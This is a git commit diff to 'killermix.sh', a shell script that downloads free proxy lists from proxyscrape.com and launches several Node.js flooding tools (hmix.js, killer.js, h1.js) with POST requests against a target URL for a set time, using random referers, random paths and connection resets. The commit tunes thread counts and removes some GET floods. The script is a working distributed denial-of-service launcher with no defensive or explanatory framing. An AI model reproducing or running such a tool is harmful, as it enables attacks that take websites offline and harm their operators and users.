2194ca4870b5e167be1b39ee37e8aa73399441dd
hackerlove123 <149338972+hackerlove123@users.noreply.github.com>
2025-04-15 08:15:13 +0700

    her

--- killermix.sh
+++ killermix.sh
@@ -11,13 +11,11 @@ for type in http https socks4 socks5; do
   curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&timeout=1000&protocol=${type}"
 done > live.txt
 
-node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 3 --full true -d false &
+node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 2 --full true -d false &
 
 node killer.js POST "$URL" "$TIME" 1 1 live.txt --query 1 --referer rand --http 1 --close --randpath --parsed --reset &
-node killer.js GET "$URL" "$TIME" 1 1 live.txt --query 1 --referer rand --http 1 --close --randpath --parsed --reset &
 
-node h1.js POST "$URL" live.txt "$TIME" 999 10 randomstring="true" &
-node h1.js GET "$URL" live.txt "$TIME" 999 10 randomstring="true" &
+node h1.js POST "$URL" live.txt "$TIME" 999 24 randomstring="true" &
 
 wait
 pkill -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js"
